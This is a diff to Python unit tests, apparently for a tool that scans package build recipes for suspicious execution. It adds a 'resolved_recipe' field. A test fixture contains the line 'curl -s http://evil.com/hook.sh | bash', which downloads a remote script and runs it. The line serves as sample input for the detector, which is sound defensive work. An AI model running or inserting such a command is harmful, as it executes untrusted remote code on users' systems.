@@ -47,6 +47,7 @@ def test_source_changes_full():
 def test_execution_changes_defaults():
     ec = ExecutionChanges()
     assert ec.resolved_commands == []
+    assert ec.resolved_recipe == []
     assert ec.suspicious_patterns_detected == []
     assert ec.unresolved_patterns == []
 
@@ -54,10 +55,12 @@ def test_execution_changes_defaults():
 def test_execution_changes_full():
     ec = ExecutionChanges(
         resolved_commands=["curl -s http://evil.com/hook.sh | bash"],
+        resolved_recipe=["pkgbase = demo"],
         suspicious_patterns_detected=["R001", "H001"],
         unresolved_patterns=["_url=$(curl ...)"],
     )
     assert len(ec.resolved_commands) == 1
+    assert ec.resolved_recipe == ["pkgbase = demo"]
     assert "R001" in ec.suspicious_patterns_detected
 
 
@@ -192,6 +195,7 @@ def test_fact_to_dict_roundtrip():
     assert d["diff_summary"]["lines_removed"] == 0
     assert d["source_changes"]["added_urls"] == []
     assert d["execution_changes"]["resolved_commands"] == []
+    assert d["execution_changes"]["resolved_recipe"] == []
 
 
 def test_fact_to_dict_json_serializable():
